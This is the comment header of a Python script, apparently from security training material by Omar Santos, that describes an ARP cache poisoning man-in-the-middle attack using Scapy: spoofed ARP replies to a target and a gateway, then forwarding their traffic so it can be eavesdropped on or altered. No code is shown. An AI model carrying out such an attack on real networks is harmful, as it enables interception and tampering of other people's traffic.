# ARP Cache Poisoning Attack using SCAPY
# Version: 0.3
# Author: Omar Santos @santosomar
# This script performs an ARP cache poisoning attack using the SCAPY library.
# It spoofs ARP replies to the target and gateway, causing them to update their ARP tables with the attacker's MAC address.
# The attacker then forwards packets between the target and gateway, allowing for eavesdropping or manipulation.
